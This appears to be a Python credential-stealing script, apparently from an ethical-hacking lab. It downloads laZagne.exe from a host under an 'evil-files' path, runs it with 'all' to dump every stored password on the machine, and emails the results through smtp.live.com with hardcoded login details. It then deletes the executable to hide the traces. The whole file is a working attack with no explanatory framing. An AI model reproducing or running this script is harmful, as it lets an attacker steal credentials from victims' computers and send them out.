#!/usr/bin/env python

import requests
import subprocess
import smtplib
import os
import tempfile

def download(url):
    response = requests.get(url)
    with open(url.split("/")[-1], "wb") as out_file:
        out_file.write(response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.live.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

tmp_dir = tempfile.gettempdir()
os.chdir(tmp_dir)

download("http://10.0.2.15/evil-files/laZagne.exe")

command = "laZagne.exe all"
try:
    result = subprocess.check_output(command, shell=True)
    send_mail("test@live.com", "test!", "\n" + result)
except Exception:
    send_mail("test@live.com", "test!", "\n error occured")

os.remove("laZagne.exe")
